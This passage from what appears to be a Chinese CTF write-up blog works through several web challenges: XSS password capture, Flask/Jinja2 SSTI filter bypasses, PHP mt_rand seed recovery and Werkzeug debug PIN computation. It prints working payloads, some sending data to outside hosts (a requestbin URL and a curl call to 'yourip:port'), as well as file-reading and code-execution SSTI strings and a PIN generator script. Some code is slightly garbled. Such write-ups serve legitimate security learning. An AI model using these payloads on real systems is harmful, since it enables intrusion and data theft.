    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>刚刚好就帮我们把document.cookie里我们想要的值取了出来，不需要cookie字段也能获得对应的数据了，然后转发一下，不是很会js，抄一个payload<br>这里需要创建一个名为password的document实体，然后用login.js把password赋给这个实体，最后再从这个实体获取数据转发出来</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"password"</span> name<span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>scrcookieipt scookierc<span class="token operator">=</span><span class="token string">"./js/login.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span>
<span class="token operator">&lt;</span>scrcookieipt<span class="token operator">></span>
    <span class="token keyword">var</span> psw <span class="token operator">=</span> docucookiement<span class="token punctuation">.</span><span class="token function">getcookieElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    docucookiement<span class="token punctuation">.</span>locacookietion<span class="token operator">=</span><span class="token string">"http://http.requestbin.buuoj.cn/tnvg49tn/?a="</span><span class="token operator">+</span>psw<span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span>
</code></pre>
<p>用buu的平台接收一下数据，password就是flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>[GWCTF 2019] 你的名字</title>
    <url>/%5BGWCTF%202019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97.html</url>
    <content><![CDATA[<h1 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h1><p>模板注入，一开始就猜到了，然后出题人害人，过滤的字符串给了个PHP的报错，还给了一个不存在的文件，又把路由设置了一个index.php。。。。不是我看wp我绝对猜不出来发生了什么</p>
<p>但是在一系列fuzz(乱按)之后发现过滤了if，for，class，这几个和ssti相关性很大的关键字，被替换为空了，但是嵌套一层也绕不过去，嵌套n层也绕不过去呜呜呜</p>
<p>wp是说一直测，能发现config这个没什么用的语句在列表后面，用这个绕过过滤，直到我下载了源码才知道是怎么回事</p>
<pre class=" language-python"><code class="language-python">blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'args'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">,</span>
                 <span class="token string">' subprocess'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'from_pyfile'</span><span class="token punctuation">,</span> <span class="token string">'local'</span><span class="token punctuation">,</span>
                 <span class="token string">'self'</span><span class="token punctuation">,</span> <span class="token string">'item'</span><span class="token punctuation">,</span> <span class="token string">'getitem'</span><span class="token punctuation">,</span> <span class="token string">'getattribute'</span><span class="token punctuation">,</span> <span class="token string">'func_globals'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> no <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> no <span class="token keyword">in</span> s<span class="token punctuation">:</span>
            s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>no<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
<span class="token keyword">return</span> s
</code></pre>
<p>一开始我还以为是递归搜索一直搜直到没有为止，结果是这么个样子，就可以用列表中靠后的项来进行绕过（不给源码全让猜真的害人）</p>
<h2 id="模板规则"><a href="#模板规则" class="headerlink" title="模板规则"></a>模板规则</h2><blockquote>
<p><code>{{...}}</code>装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。<br><code>{% ... %}</code>：装载一个控制语句。<br><code>{# ... #}</code>：装载一个注释，模板渲染的时候会忽视这中间的值。</p>
</blockquote>
<p>所以双大括号这种表示方式就是可以直接回显在页面上的，而这种方式被过滤了，还给了一个编出来的PHP假报错（害人）<br>所以结果就不能直接外带了，只能通过{% %}执行命令的方式来外带数据了<br>payload：<code>{% if ''.__class__.__mro__[2];.__subclasses__()[59];.__init__.func_globals.linecache.os.popen('curl http://yourip:port/ -d ls / | grep flag;') %}1{% endif %}</code><br>把过滤的字符串中都加一个config来绕过过滤</p>
<p>这里用os.popen函数执行命令，但是curl发出来只能发出来第一行，所以一开始ls的时候返回就一个app我人都是懵的，wp是通过grep来搜索flag文件<br>最后想了想，既然都是外带，不如直接反弹shell，简单粗暴，然后就可以任意遨游了<br>在根目录下取得flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>[GWCTF_2019]枯燥的抽奖</title>
    <url>/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96.html</url>
    <content><![CDATA[<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>伪随机数安全的一个题，通过php_mt_rand这个工具逆向出随机数种子，然后通过种子获取字符串</p>
<p>贴一下源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">}</span>
<span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;p id='p1'>"</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x
        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>mt_rand(min,max)函数返回该区间内的任意一个数，通过如下脚本得到逆向所需数据，通过php_mt_rand工具爆破出种子</p>
<pre class=" language-python"><code class="language-python">str1 <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
str2 <span class="token operator">=</span> <span class="token string">'o117Ak7VLV'</span>
length <span class="token operator">=</span> len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span>
res <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
</code></pre>
<p>个人认为res就是还原了伪随机数生成的序列，四个数字一组，重复两遍随机结果，后接随机数范围(不知道为什么随机结果要重复两遍)</p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>php不同版本随机数之间是有差距的，php_mt_rand工具会提示获取的种子对应的PHP版本，这个题跑出来的种子为PHP7版本的，我本地实验的时候选的PHP5的解释器，发现结果不对想了半天</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>伪随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>[GYCTF2020]FlaskApp</title>
    <url>/%5BGYCTF2020%5DFlaskApp.html</url>
    <content><![CDATA[<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>flask的模板注入加一个debug模式下的命令执行</p>
<p>题目开局给的是一个base64的加解密网站，说明了是flask写的，hint界面在注释里面藏了一句PIN（我一开始还不知道是什么意思）<br>后来在解码处输入了一个错误的字符串，进入了debug界面，可以看到解码部分的源码</p>
<pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/decode'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>
        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>
        text_decode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        tmp <span class="token operator">=</span> <span class="token string">"结果 ： {0}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>text_decode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"no no no !!"</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        res <span class="token operator">=</span>  render_template_string<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
</code></pre>
<p>发现在debug模式下可以运行一个shell，但是要输入一个叫PIN码的东西，这个就是提示中出现的PIN了，每个机器的PIN码是由几个数据固定生成的，那么我们只要读取到对应的文件，自然就能计算出PIN从而任意命令执行<br>而这里又使用了模板渲染，自然可以测一下ssti，简单的{{8+8}}可以被计算即可证明存在模板注入。不过这里也提出了有Waf，就需要测一下waf禁用了什么。简单找几个payload试试，发现os，flag和popen，system，import之类的常用命令执行的字段被禁用了，不过就这种过滤还是很容易绕过的，毕竟还是得用ssti读文件去计算PIN码，网上找几个payload就可以了</p>
<h2 id="ssti-payload"><a href="#ssti-payload" class="headerlink" title="ssti payload"></a>ssti payload</h2><p>不过python不同版本的payload不一定通用，顺便也收集一些</p>
<h3 id="python3-7："><a href="#python3-7：" class="headerlink" title="python3.7："></a>python3.7：</h3><p>读文件<br><code>{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}</code><br><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}</code>字符串切片方式翻转字符串绕过检测<br>代码执行<br><code>{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}</code><br>扫目录，结果就是发现了flag位置就可以直接读取了，是一个非预期</p>
<h3 id="python2-7"><a href="#python2-7" class="headerlink" title="python2.7"></a>python2.7</h3><p>读文件<br><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code><br>代码执行</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/tmp/evalcode'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'evalcode'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span> config<span class="token punctuation">.</span>from_pyfile<span class="token punctuation">(</span><span class="token string">'/tmp/evalcode'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>

</code></pre>
<p>各种绕过payload<br><a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>需要六个数据来计算PIN码<br>1.运行app的用户名，读&#x2F;etc&#x2F;passwd<br>2.module name 一般固定为flask.app<br>3.<code>getattr(app, &quot;\_\_name\_\_&quot;, app.\_\_class\_\_.\_\_name\_\_)</code>的结果。就是<code>Flask</code><br>4.flask库下app.py的绝对路径，不是当前运行的app.py的路径，在debug模式下报错就能直接看见，该题为<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br>5.当前网络的mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address读取，eth0为当前使用的网卡，如果有多个网卡数字可能会变，这里为<code>02:42:ae:00:c3:58</code>，转十进制为 2485410382680<br>6.机器的id<br>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，序列号为1那行<br><code>1:name=systemd:/docker/210b2177689514627fab120347f7d1ea1e986bed6a9ef57504e2e3ac22e38c3c</code></p>
<p>全部凑齐之后就可以计算PIN了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'flaskweb'</span><span class="token punctuation">,</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span>
    <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'2485410382680'</span><span class="token punctuation">,</span>
    <span class="token string">'210b2177689514627fab120347f7d1ea1e986bed6a9ef57504e2e3ac22e38c3c'</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> None
<span class="token keyword">if</span> num <span class="token keyword">is</span> None<span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> int<span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span>None
<span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                          <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span>
</code></pre>
<p>算出PIN为610-413-249，就可以为所欲为了，不过PIN最多10亿种可能，爆破有有可能是一种办法？</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>flask</tag>
        <tag>ssti</tag>
        <tag>PIN</tag>
      </tags>
  </entry>
  <entry>
    <title>[GYCTF2020]ezExpress</title>
    <url>/%5BGYCTF2020%5DezExpress.html</url>
    <content><![CDATA[<h1 id="GYCTF2020-ezExpress"><a href="#GYCTF2020-ezExpress" class="headerlink" title="[GYCTF2020]ezExpress"></a>[GYCTF2020]ezExpress</h1><p>又是一个js题，原型链污染和toUppercase，最后发现居然还有express框架的SSTI<br>源码在www.zip下<br>主要逻辑是&#x2F;route&#x2F;index.js</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> isObject <span class="token operator">=</span> obj <span class="token operator">=</span><span class="token operator">></span> obj <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Object<span class="token punctuation">;</span>
<span class="token keyword">const</span> merge <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> a
<span class="token punctuation">}</span>
<span class="token keyword">const</span> clone <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">safeKeyword</span><span class="token punctuation">(</span>keyword<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>keyword<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">(</span>admin<span class="token punctuation">)</span><span class="token operator">/</span>is<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> keyword
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> undefined
<span class="token punctuation">}</span>

<span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">.</span>

router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
